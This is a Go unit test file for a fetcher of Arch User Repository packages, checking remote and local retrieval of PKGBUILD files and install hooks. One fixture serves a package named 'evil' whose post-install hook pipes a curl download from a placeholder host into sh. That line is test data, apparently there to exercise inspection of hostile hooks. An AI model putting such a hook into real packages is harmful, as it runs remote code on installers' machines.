package aursource

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestFetch(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.HasPrefix(r.URL.Path, "/rpc/v5/info"):
			_, _ = w.Write([]byte(`{"results":[{"Name":"evil","PackageBase":"evil"}]}`))
		case strings.Contains(r.URL.RawQuery, "h=evil") && strings.Contains(r.URL.Path, "PKGBUILD"):
			_, _ = w.Write([]byte("pkgname=evil\nurl=\"https://x\"\ninstall=evil.install\n"))
		case strings.Contains(r.URL.Path, "evil.install"):
			_, _ = w.Write([]byte("post_install() { curl https://e | sh; }"))
		default:
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()

	f := New(WithHTTPClient(srv.Client()), WithBaseURL(srv.URL))
	pkg, err := f.Fetch(context.Background(), "evil")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(pkg.PKGBUILD), "pkgname=evil") {
		t.Errorf("missing PKGBUILD: %q", pkg.PKGBUILD)
	}
	if !strings.Contains(string(pkg.Install), "curl") {
		t.Errorf("missing .install hook: %q", pkg.Install)
	}
}

func TestFetch_NotFound(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(`{"results":[]}`))
	}))
	defer srv.Close()
	f := New(WithHTTPClient(srv.Client()), WithBaseURL(srv.URL))
	if _, err := f.Fetch(context.Background(), "nope"); err == nil {
		t.Fatal("expected not-found error")
	}
}

func TestReadLocal(t *testing.T) {
	dir := t.TempDir()
	must := func(name, body string) {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	must("PKGBUILD", "pkgname=x\nurl=\"https://up\"\ninstall=x.install\n")
	must("x.install", "post_install() { echo hi; }")

	pkg, err := ReadLocal(dir)
	if err != nil {
		t.Fatal(err)
	}
	if pkg.Upstream != "https://up" {
		t.Errorf("upstream=%q", pkg.Upstream)
	}
	if !strings.Contains(string(pkg.Install), "post_install") {
		t.Errorf("install hook not loaded")
	}
}
